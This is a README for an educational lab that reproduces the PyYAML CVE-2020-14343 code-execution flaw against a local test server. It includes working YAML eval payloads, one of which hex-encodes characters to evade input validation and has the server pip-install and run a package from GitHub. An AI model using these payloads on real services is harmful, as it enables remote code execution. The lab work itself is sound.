=====================
pyyaml-CVE-2020-14343
=====================
Testing the `CVE-2020-14343`_ vulnerability that affects the `PyYAML`_ library (version<5.4) 
"where it is susceptible to arbitrary code execution when it processes untrusted YAML 
files through the ``full_load`` method or with the ``FullLoader`` loader." [BUG]_

The whole testing setup is contained within the `test_yaml_vuln`_ package which must
be `installed`_ to have access to the `scripts`_ necessary for performing the
different `tests`_.

`:warning:`

  **Disclaimer**

  This repository is for educational and informational purposes 
  only. The author, raul23, assumes no responsibility for the use 
  of this repository, code or any information contained therein. 
  The user is solely responsible for any action he/she takes with 
  this repository, code and information contained in it.

  Do not abuse this material. Be responsible.

.. contents:: **Contents**
   :depth: 4
   :local:
   :backlinks: top

Testing environment
===================
- **Execution platform:** macOS with `conda`_ (environment manager)
- **Python prerequisites:**

  - ``Python`` >=3.7
  - `pyyaml`_: multiple versions of PyYAML were tested
  
    - ``pyyaml`` 3.13 (Jul 5, 2018) - vulnerable
    - ``pyyaml`` 5.1 (Mar 13, 2019) - vulnerable
    - ``pyyaml`` 5.3 (Jan 6, 2020) - vulnerable
    - ``pyyaml`` 5.4 (Jan 19, 2021) - not vulnerable
    
    `:information_source:`

      * The `CVE-2020-14343`_ vulnerability was fixed in PyYAML version 5.4 [BUG]_
      * The provided `server.py`_ script uses 
        `conda`_ to create a virtual environment for each ``pyyaml`` version
      
  - `Flask`_ (OPTIONAL): for building a simple server that will read a payload sent 
    as a ``yaml`` file containing the risky *YAML* syntax. If you don't have ``Flask``, 
    then a simple web server implemented with built-in Python modules will be used.
    
    `:star:`
     
      The version choosen for ``Flask`` is not that important. Just get the
      latest version (v1.1.2) or if you already had installed it, the version you 
      have should be good enough for the tests. What is important is the version of 
      ``pyyaml``

Install the scripts
===================
Install the `scripts`_ necessary for performing the `tests`_:

.. code-block:: bash

   pip install git+https://github.com/raul23/pyyaml-CVE-2020-14343#egg=pyyaml-CVE-2020-14343

Uninstall the scripts
=====================
First remove all conda environments created for the `tests`_ (if that was the case):

.. code-block:: bash

   server -r

.. activated conda env not part of the envs to be removed

Uninstall the `scripts`_:

.. code-block:: bash

   pip uninstall pyyaml-CVE-2020-14343

Code
====
The code used by the `tests`_ consists in a simple Python `web server`_, a 
`client script`_ for sending payloads (``yaml`` files) and `utils.py`_ (common
code used by both scripts), all within the `test_yaml_vuln`_ package:

- `test_yaml_vuln`_

  - **Python scripts:**

    * `server.py`_
    * `client.py`_
    
  - **Payloads:**

    * `payload01.yaml`_
    * `payload02.yaml`_
    * `payload03.yaml`_
.. * `payload04.yaml`_
    
  - `utils.py`_

``server.py``
-------------
Description
"""""""""""
The `server.py`_ script implements two simple web servers:

1. Built-in web server: a web server implemented with built-in Python modules. 
   It is used if the user doesn't have the `flask`_ module installed. 
   
   * ``BaseHTTPServer`` for the web server
   * ``cgi`` for getting POST form data (i.e. content of ``yaml`` files)
2. `Flask`_ web server

.. _input-validation-regex:

Both servers apply input validation to the content of ``yaml`` files. This
validation procedure consists of a basic regex ``^[\n --/-\]a-}]*$`` that checks the 
input (``yaml`` payload) sent by the client. The payload is rejected by the
server if its content has any of the following special characters:
  
  - ``.`` (Full stop; period)
  - ``^`` (Circumflex)
  - ``_`` (Underscore)
  - ````` (Backtick)
  - ``~``	(Tilde)
  
Both servers also only respond to POST requests that contain the content of
``yaml`` files the server might eventually load with ``pyyaml``.

`:information_source:`

  * The built-in web server code is based from Codexpedia [COD]_
  * The Flask server code is based from a note published @ hackmd.io by *harrier-lcc* [HAR]_

.. fixed: ^[\n --\/-\]a-}]*$

Options
"""""""
Get the options for the `server.py`_ script with the ``-h`` flag:

.. code-block:: bash

   server -h
   
.. code-block:: terminal

   usage: server [OPTIONS]

   General options:
     -h, --help                             Show this help message and exit.
     -v, --version                          Show program's version number and exit.

   Create conda environments:
     -c, --create-envs                      Create all conda environments for testing with the CVE-2020-14343 PyYAML
                                            vulnerability. One conda environment for each of the following PyYAML
                                            version: [3.13, 5.1, 5.3, 5.4]
     -f, --install-flask                    Install flask for each created conda environment.

   Remove conda environments:
     -r, --remove-envs                      Delete all conda environments used for testing with the CVE-2020-14343 PyYAML
                                            vulnerability.

   Run web server:
     --host HOST                            Host and port for the server to run, e.g. 0.0.0.0:8080 (default:
                                            0.0.0.0:8080)
     -y, --yaml-version {3.13,5.1,5.3,5.4}  Use a particular PyYAML version for the server to run.

.. _server-options-info:

`:information_source:`

  * ``-c, --create-envs``: creates conda environments with the ``pyyaml`` versions 
    mentionned in `Testing environment`_
  * ``-f, --install-flask``: if enabled, `Flask`_ will be installed on each created conda
    environment. Thus the flask web server will be used instead of the web server implemented
    with built-in modules, as explained in `Description`_
  * ``-r, --remove-envs``: deletes all the conda environments as created with the ``--c`` flag
  * ``-y, --yaml-version``: allows you to run the web server with a specific ``pyyamml`` version
    from the ones supported
  * ``--host``: instead of typing ``0.0.0.0:8080``, you can use ``0:8080`` or ``localhost:8080``

``client.py``
-------------
Description
"""""""""""
The `client.py`_ script sends a payload as a ``yaml`` file to the listening 
`server.py`_. The payload contains risky ``yaml`` syntax that tries to exploit the
`CVE-2020-14343`_ vulnerability that affects PyYAML versions < 5.4 by making the
server execute remote code.

By default, `three payloads`_ are available but you can also customize your `own
payloads`_.

Options
"""""""
Get the options for the ``client.py`` script with the ``-h`` flag:

.. code-block:: bash

   client -h
   
.. code-block:: terminal

   usage: client [OPTIONS]

   General options:
     -h, --help                         Show this help message and exit.
     -v, --version                      Show program's version number and exit.

   Send payload:
     --host HOST                        Host and port of the server to connect, e.g. 0.0.0.0:8080 (default: 0.0.0.0:8080)
     --dp, --default-payload {1,2,3}    ID of the default payload to send to the server. Check the corresponding yaml
                                        file of the payload ID: ['payload01.yaml', 'payload02.yaml', 'payload03.yaml']
     --cp, --custom-payload FILE        Custom payload (yaml file) to send to the server.

`:information_source:`

  * ``--dp, --default-payload``: the given ID is associated to one of the default payloads 
    mentionned in `Default payloads`_
  * ``--cp, --custom-payload``: takes the path to your `custom`_ ``yaml`` file that you will be
    sent to the listening server

`:warning:`
  
  The ``--dp`` and ``--cp`` arguments are both mutually exclusive, i.e. you can only send
  one type of payload (default or custom) to the server at a time

Payloads
""""""""
Payloads are sent to the listening `server.py`_ as ``yaml`` files. Two types of payloads 
can be sent to the listening `server.py`_:

* `default payloads`_
* `custom payloads`_

Default payloads
````````````````
A default payload is sent to the server as a ``yaml`` file with the ``--dp`` option:

.. code-block:: bash

   client --dp 1

.. $ curl -F file=@payload{NUMBER}.txt http://0.0.0.0:8080
   
The payload sent to the server by ``client.py`` can be any of the following default 
``yaml`` files:

.. _first-payload:

- ``--dp 1``: `payload01.yaml`_

  .. code-block:: yaml
  
     !!python/object/new:tuple 
     - !!python/object/new:map 
       - !!python/name:eval
       - [ print('RCE EXPLOIT!') ]
       
  **NOTE:** This payload prints only a message on vulnerable ``pyyaml`` versions

.. _second-payload:

- ``--dp 2``: `payload02.yaml`_

  .. code-block:: yaml
  
     !!python/object/new:tuple 
     - !!python/object/new:map 
       - !!python/name:eval
       - [ print('invalid_message') ]
  
  **NOTE:** This payload prints a message containing an underscore (``_``) which should be
  `detected`_ by the server as an invalid character

.. _third-payload:

- ``--dp 3``: `payload03.yaml`_

  .. code-block:: yaml
  
     !!python/object/new:tuple
     - !!python/object/new:map
       - !!python/name:eval
       - [ "\x5f\x5fimport\x5f\x5f('os')\x2esystem('pip install -q git+https://github\x2ecom/raul23/Maximum#egg=Maximum')" ,
           "\x5f\x5fimport\x5f\x5f('os')\x2esystem('runmax')" ]
       
  **NOTES:**
  
  * To bypass the simple `input validation`_ performed by the web server before loading
    the ``yaml`` payload, the following substitutions are used by the client:
  
    * ``\x5f`` is for the underscore ``_``
    * ``\x2e`` is for the period ``.``
  
  * The strings passed to ``eval`` use ``os.system`` to run commands on the `server`_ on 
    behalf of the `client`_:
  
    * The first command installs quietly the `maximum`_ Python package from *github.com* 
      using the ``-q`` flag from the ``pip`` command
    * The second command executes ``maximum``\'s `runmax.py`_ script
      which only outputs "Hello!" (for testing purposes)

.. _fourth-payload:

.. 
   - ``--dp 4``: `payload04.yaml`_

     .. code-block:: yaml

        !!python/object/new:tuple 
        - !!python/object/new:map 
          - !!python/name:eval
          - [ print('TODO') ]

     **NOTE:** TODO

`:information_source:`

  The payloads are based from a note published @ hackmd.io by *harrier-lcc* [HAR]_

Custom payloads
```````````````
You can also specify your own payload with the ``--cp`` option:

.. code-block:: bash

   client --cp my_payload.yaml
   
where **my_payload.yaml** contains the following:

.. code-block:: yaml

   !!python/object/new:tuple 
   - !!python/object/new:map 
     - !!python/name:eval
     - [ print('my payload') ]

How to use the scripts
----------------------
Create all conda environments
"""""""""""""""""""""""""""""
Create all four conda environments with each having a different PyYAML version,
`pyyaml-CVE-2020-14343` (this project) and `Flask`_ installed:

.. code-block:: bash

   server -cf
   
.. code-block:: terminal

   Creating conda environment 'yaml313' ...
   Created!
   Installing pyyaml-CVE-2020-14343 ...
   Installed!
   Installing pyyaml 3.13 ...
   Installed!
   Installing flask ...
   Installed!

   Creating conda environment 'yaml51' ...
   Created!
   Installing pyyaml-CVE-2020-14343 ...
   Installed!
   Installing pyyaml 5.1 ...
   Installed!
   Installing flask ...
   Installed!

   Creating conda environment 'yaml53' ...
   Created!
   Installing pyyaml-CVE-2020-14343 ...
   Installed!
   Installing pyyaml 5.3 ...
   Installed!
   Installing flask ...
   Installed!

   Creating conda environment 'yaml54' ...
   Created!
   Installing pyyaml-CVE-2020-14343 ...
   Installed!
   Installing pyyaml 5.4 ...
   Installed!
   Installing flask ...
   Installed!

where the following conda environments are created with the corresponding PyYAML 
version:

* ``yaml313``: conda environment with PyYAML 3.13 (build: py37h1de35cc_0)
* ``yaml51``: conda environment with PyYAML 5.1 (build: py37h1de35cc_0)
* ``yaml53``: conda environment with PyYAML 5.3 (build: py37h1de35cc_0)
* ``yaml54``: conda environment with PyYAML 5.4 (build: py37h9ed2024_1)

`:information_source:`

  * ``pyyaml-CVE-2020-14343`` (this project) is also installed on each conda
    environment since we will run `server.py`_ on different conda environments
    with their associated PyYAML version installed
  * The `-c`_ flag is for creating the different conda environments
  * The `-f`_ flag is for installing `Flask`_ on each conda environment

Run the web server
""""""""""""""""""
Run the server in a terminal using a specific PyYAML version:

.. code-block:: bash

   server -y 3.13

**Output:**
  
.. code-block:: terminal

   * Conda env: yaml313
   * PyYAML version: 3.13
   * Serving Flask app "test_yaml_vuln.server" (lazy loading)
   * Environment: production
     WARNING: This is a development server. Do not use it in a production deployment.
     Use a production WSGI server instead.
   * Debug mode: off
   * Running on http://0.0.0.0:8080/ (Press CTRL+C to quit)
  
`:information_source:`

  * The server will use the 3.13 PyYAML version which is affected by `CVE-2020-14343`_
  * If the server is run without the ``-y`` flag, then the PyYAML library from the 
    Python environment executing the script will be used

Send the payload
""""""""""""""""
You can send a default payload (``yaml`` file) to the `listening server`_ with the 
``--dp`` option:

.. code-block:: bash

   client --dp 1
   
`:information_source:`

  The first payload (`payload01.yaml`_) is sent to the server.

.. $ curl -F file=@payload01.txt http://0.0.0.0:8080

The web server will output among other things:

.. code-block:: terminal

   Loading yaml file...
   RCE EXPLOIT!

Tests
=====
The following tests consist in running a `simple
web server`_ that will read a payload sent as a ``yaml`` file 
by the `client script`_. Also, each test is
associated to a specific version of ``pyyaml``.

`:star:`

  Setup the following tests by creating first the conda environments associated
  with each test by running the `server.py`_ script with the ``-cf`` flags:
  
  .. code-block:: bash
  
     server -cf
     
  See also `Create all conda environments`_.

Test 1: ``pyyaml`` 3.13
-----------------------
Run the server with the following command:

.. code-block:: bash

   server -y 3.13
   
.. code-block:: terminal

   * Conda env: yaml313
   * PyYAML version: 3.13
   * Serving Flask app "test_yaml_vuln.server" (lazy loading)
   * Environment: production
     WARNING: This is a development server. Do not use it in a production deployment.
     Use a production WSGI server instead.
   * Debug mode: off
   * Running on http://0.0.0.0:8080/ (Press CTRL+C to quit)

`:information_source:`

  The server is running within the ``yaml313`` conda environment which has ``pyyaml`` 
  version 3.13 installed

Send the first default payload
""""""""""""""""""""""""""""""
Send the `first default payload`_ to the vulnerable server with the following command:

.. code-block:: bash

  client --dp 1

Once the server receives the payload, it outputs the following:

.. code-block:: terminal

   Loading yaml file...
   RCE EXPLOIT!
|

`:information_source:`

  The server with PyYAML version 3.13 is vulnerable to maliciously constructed ``yaml`` files
  and the installed PyYAML doesn't even warn the users that the default loader is unsafe 
  like other more recent versions do (e.g. PyYAML version 5.1 like in the `next test`_)

Send the second default payload
"""""""""""""""""""""""""""""""
Send the `second default payload`_ to the server with the following command:

.. code-block:: bash

  client --dp 2

.. _exp-1-second-payload-info:

The server doesn't load the payload with ``yaml.load()`` because its `input validation 
regex`_ detects an invalid character (``_``) in the file content and consequently, the
server rejects the ``yaml`` file as invalid. The server returns the following to the
client:

.. code-block:: terminal

   Nice try!
   
Send the third default payload
""""""""""""""""""""""""""""""
Send the `third default payload`_ to the server with the following command:

.. code-block:: bash

  client --dp 3

The server outputs the following:

.. code-block:: termninal
  
  Loading yaml file...
  Hello!

.. _exp-1-third-payload-info:

`:information_source:`

  The server with PyYAML version 3.13 installed the `maximum`_ Python package
  and ran its `runmax.py`_ script which only outputs "Hello!" (for testing
  purposes) as instructed in the maliciously constructed `third default payload`_.

Test 2: ``pyyaml`` 5.1
----------------------
Run the server with the following command:

.. code-block:: bash

   server -y 5.1
   
.. code-block:: terminal

   * Conda env: yaml51
   * PyYAML version: 5.1
   * Serving Flask app "test_yaml_vuln.server" (lazy loading)
   * Environment: production
     WARNING: This is a development server. Do not use it in a production deployment.
     Use a production WSGI server instead.
   * Debug mode: off
   * Running on http://0.0.0.0:8080/ (Press CTRL+C to quit)

`:information_source:`

  The server is running within the ``yaml51`` conda environment which has ``pyyaml`` 
  version 5.1 installed

Send the first default payload
""""""""""""""""""""""""""""""
Send the `first default payload`_ to the vulnerable server with the following command:

.. code-block:: bash

  client --dp 1

Once the server receives the payload, it outputs the following:

.. code-block:: terminal

   Loading yaml file...
   server.py:45: YAMLLoadWarning: calling yaml.load() without Loader=... is deprecated, as the default Loader is unsafe. Please read https://msg.pyyaml.org/load for full details.
     yaml.load(file_content)
   RCE EXPLOIT!

|

`:information_source:`

  The server with PyYAML version 5.1 is vulnerable to maliciously constructed ``yaml`` files.
  However, the installed PyYAML at least warns the users that the default loader is unsafe 
  unlike older versions (e.g. PyYAML version 3.13 like in the `previous test`_)

Send the second default payload
"""""""""""""""""""""""""""""""
Send the `second default payload`_ to the server with the following command:

.. code-block:: bash

  client --dp 2

The server returns the following to the client:

.. code-block:: terminal

   Nice try!
   
`:information_source:`

  Same explanation as in `Test 1\: pyyaml 3.13`_.

Send the third default payload
""""""""""""""""""""""""""""""
Send the `third default payload`_ to the server with the following command:

.. code-block:: bash

  client --dp 3

The server outputs the following:

.. code-block:: termninal
  
  Loading yaml file...
  Hello!

`:information_source:`

  Same explanation as in `Test 1\: pyyaml 3.13 <#exp-1-third-payload-info>`__.

Test 3: ``pyyaml`` 5.3
----------------------
Run the server with the following command:

.. code-block:: bash

   server -y 5.3
   
.. code-block:: terminal

   * Conda env: yaml53
   * PyYAML version: 5.3
   * Serving Flask app "test_yaml_vuln.server" (lazy loading)
   * Environment: production
     WARNING: This is a development server. Do not use it in a production deployment.
     Use a production WSGI server instead.
   * Debug mode: off
   * Running on http://0.0.0.0:8080/ (Press CTRL+C to quit)

`:information_source:`

  The server is running within the ``yaml53`` conda environment which has ``pyyaml`` 
  version 5.3 installed

Send the first default payload
""""""""""""""""""""""""""""""
Send the `first default payload`_ to the vulnerable server with the following command:

.. code-block:: bash

  client --dp 1

Once the server receives the payload, it outputs the following:

.. code-block:: terminal

   Loading yaml file...
   server.py:45: YAMLLoadWarning: calling yaml.load() without Loader=... is deprecated, as the default Loader is unsafe. Please read https://msg.pyyaml.org/load for full details.
     yaml.load(file_content)
   RCE EXPLOIT!

|

`:information_source:`

  The server with PyYAML version 5.3 is vulnerable to maliciously constructed ``yaml`` files.
  However, the installed PyYAML at least warns the users that the default loader is unsafe 
  unlike older versions (e.g. PyYAML version 3.13 like in a `previous test`_)

Send the second default payload
"""""""""""""""""""""""""""""""
Send the `second default payload`_ to the server with the following command:

.. code-block:: bash

  client --dp 2

The server returns the following to the client:

.. code-block:: terminal

   Nice try!
   
`:information_source:`

  Same explanation as in `Test 1\: pyyaml 3.13`_.

Send the third default payload
""""""""""""""""""""""""""""""
Send the `third default payload`_ to the server with the following command:

.. code-block:: bash

  client --dp 3

The server outputs the following:

.. code-block:: termninal
  
  Loading yaml file...
  Hello!

`:information_source:`

  Same explanation as in `Test 1\: pyyaml 3.13 <#exp-1-third-payload-info>`__.

Test 4: ``pyyaml`` 5.4
----------------------
Run the server with the following command:

.. code-block:: bash

   server -y 5.4
   
.. code-block:: terminal

   * Conda env: yaml54
   * PyYAML version: 5.4
   * Serving Flask app "test_yaml_vuln.server" (lazy loading)
   * Environment: production
     WARNING: This is a development server. Do not use it in a production deployment.
     Use a production WSGI server instead.
   * Debug mode: off
   * Running on http://0.0.0.0:8080/ (Press CTRL+C to quit)

`:information_source:`

  The server is running within the ``yaml54`` conda environment which has ``pyyaml`` 
  version 5.4 installed

Send the first default payload
""""""""""""""""""""""""""""""
Send the `first default payload`_ to the listening server with the following command:

.. code-block:: bash

  client --dp 1

Once the server receives the payload, it outputs the following:

.. code-block:: terminal

   Loading yaml file...
   server.py:45: YAMLLoadWarning: calling yaml.load() without Loader=... is deprecated, as the default Loader is unsafe. Please read https://msg.pyyaml.org/load for full details.
     yaml.load(file_content)
   [2021-07-09 19:35:44,681] ERROR in app: Exception on / [POST]
   Traceback (most recent call last):
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/flask/app.py", line 2447, in wsgi_app
       response = self.full_dispatch_request()
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/flask/app.py", line 1952, in full_dispatch_request
       rv = self.handle_user_exception(e)
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/flask/app.py", line 1821, in handle_user_exception
       reraise(exc_type, exc_value, tb)
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/flask/_compat.py", line 39, in reraise
       raise value
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/flask/app.py", line 1950, in full_dispatch_request
       rv = self.dispatch_request()
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/flask/app.py", line 1936, in dispatch_request
       return self.view_functions[rule.endpoint](**req.view_args)
     File "server.py", line 42, in pwnme
       yaml.load(file_content)
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/yaml/__init__.py", line 114, in load
       return loader.get_single_data()
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/yaml/constructor.py", line 51, in get_single_data
       return self.construct_document(node)
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/yaml/constructor.py", line 55, in construct_document
       data = self.construct_object(node)
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/yaml/constructor.py", line 100, in construct_object
       data = constructor(self, node)
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/yaml/constructor.py", line 429, in construct_undefined
       node.start_mark)
   yaml.constructor.ConstructorError: could not determine a constructor for the tag 'tag:yaml.org,2002:python/object/new:tuple'
     in "<byte string>", line 1, column 1:
       !!python/object/new:tuple 
       ^
   127.0.0.1 - - [09/Jul/2021 19:35:44] "POST / HTTP/1.1" 500 -

|

The client receives the following HTML content:

.. code-block:: terminal

   <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
   <title>500 Internal Server Error</title>
   <h1>Internal Server Error</h1>
   <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>

`:information_source:`

  * The installed PyYAML (version 5.4) warns the users that the default loader is unsafe
  * As expected (since the vulnerability was fixed in PyYAML version 5.4), the server 
    is not vulnerable to maliciously constructed ``yaml`` files
    and hence it is not able to load the faulty ``yaml`` file

Send the second default payload
"""""""""""""""""""""""""""""""
Send the `second default payload`_ to the server with the following command:

.. code-block:: bash

  client --dp 2

The server returns the following to the client:

.. code-block:: terminal

   Nice try!
   
`:information_source:`

  Same explanation as in `Test 1\: pyyaml 3.13`_.

Send the third default payload
""""""""""""""""""""""""""""""
Send the `third default payload`_ to the server with the following command:

.. code-block:: bash

  client --dp 3

The server outputs the following:

.. code-block:: termninal
  
   Loading yaml file...
   [2021-07-12 00:06:31,386] ERROR in app: Exception on / [POST]
   Traceback (most recent call last):
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/flask/app.py", line 2447, in wsgi_app
       response = self.full_dispatch_request()
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/flask/app.py", line 1952, in full_dispatch_request
       rv = self.handle_user_exception(e)
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/flask/app.py", line 1821, in handle_user_exception
       reraise(exc_type, exc_value, tb)
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/flask/_compat.py", line 39, in reraise
       raise value
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/flask/app.py", line 1950, in full_dispatch_request
       rv = self.dispatch_request()
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/flask/app.py", line 1936, in dispatch_request
       return self.view_functions[rule.endpoint](**req.view_args)
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/test_yaml_vuln/server.py", line 45, in pwnme
       yaml.load(file_content)
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/yaml/__init__.py", line 114, in load
       return loader.get_single_data()
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/yaml/constructor.py", line 51, in get_single_data
       return self.construct_document(node)
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/yaml/constructor.py", line 55, in construct_document
       data = self.construct_object(node)
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/yaml/constructor.py", line 100, in construct_object
       data = constructor(self, node)
     File "/Users/test/miniconda3/envs/yaml54/lib/python3.7/site-packages/yaml/constructor.py", line 429, in construct_undefined
       node.start_mark)
   yaml.constructor.ConstructorError: could not determine a constructor for the tag 'tag:yaml.org,2002:python/object/new:tuple'
     in "<byte string>", line 1, column 1:
       !!python/object/new:tuple
       ^
   127.0.0.1 - - [12/Jul/2021 00:06:31] "POST / HTTP/1.1" 500 -

`:information_source:`

  * The installed PyYAML (version 5.4) warns the users that the default loader is unsafe
  * As expected (since the vulnerability was fixed in PyYAML version 5.4), the server 
    is not vulnerable to maliciously constructed ``yaml`` files
    and hence it is not able to load the faulty ``yaml`` file. The two commands found in
    the faulty ``yaml`` file (i.e. install a Python package and run its script) are not 
    executed.

.. 
 Part II: More tests
 ===================
 The following tests consist in testing only ``pyyaml`` version 5.3 which 
 is affected by `CVE-2020-14343`_. The code used for each of the following tests
 is different unlike the tests in Part I which all share a common code (server and
 payloads).

References
==========
.. [BUG] “Bug 1860466 – (CVE-2020-14343) CVE-2020-14343 PyYAML: Incomplete Fix for CVE-2020-1747.” 
   *Redhat.Com*, https://bugzilla.redhat.com/show_bug.cgi?id=1860466. Accessed 30 June 2021.

.. [COD] “Python Web Server for GET and POST Requests.” *Codexpedia.Com*, 
    https://www.codexpedia.com/python/python-web-server-for-get-and-post-requests/. 
    Accessed 11 July 2021.

.. [HAR] “Uiuctf 2020 - HackMD.” *Hackmd.Io*, https://hackmd.io/@harrier/uiuctf20. 
   Accessed 30 June 2021.

.. URLs external links
.. _conda: https://docs.conda.io/projects/conda/en/latest/user-guide/getting-started.html
.. _CVE-2020-14343: https://access.redhat.com/security/cve/cve-2020-14343
.. _flask: https://flask.palletsprojects.com/
.. _maximum: https://github.com/raul23/Maximum
.. _pyyaml: https://pypi.org/project/PyYAML/
.. _runmax.py: https://github.com/raul23/Maximum/blob/main/maximum/runmax.py

.. URLs within project
.. _client.py: ./test_yaml_vuln/client.py
.. _payload01.yaml: ./test_yaml_vuln/payload01.yaml
.. _payload02.yaml: ./test_yaml_vuln/payload02.yaml
.. _payload03.yaml: ./test_yaml_vuln/payload03.yaml
.. _payload04.yaml: ./test_yaml_vuln/payload04.yaml
.. _server.py: ./test_yaml_vuln/server.py
.. _utils.py: ./test_yaml_vuln/utils.py
.. _test_yaml_vuln: ./test_yaml_vuln

.. URLs internal
.. _-c: #server-options-info
.. _-f: #server-options-info
.. _client: #client-py
.. _client script: #client-py
.. _Create all conda environments: #create-all-conda-environments
.. _custom: #custom-payloads
.. _custom payloads: #custom-payloads
.. _Default payloads: #default-payloads
.. _Description: #description
.. _detected: #input-validation-regex
.. _first default payload: #first-payload
.. _three payloads: #default-payloads
.. _input validation: #input-validation-regex
.. _input validation regex: #input-validation-regex
.. _installed: #install-the-scripts
.. _listening server: #run-the-web-server
.. _next test: #test-2-pyyaml-5-1
.. _own payloads: #custom-payloads
.. _payloads: #payloads
.. _previous test: #send-the-first-default-payload
.. _scripts: #code
.. _second default payload: #second-payload
.. _server: #server-py
.. _simple web server: #server-py
.. _Test 1\: pyyaml 3.13: #exp-1-second-payload-info
.. _Testing environment: #testing-environment
.. _tests: #tests
.. _third default payload: #third-payload
.. _web server: #server-py
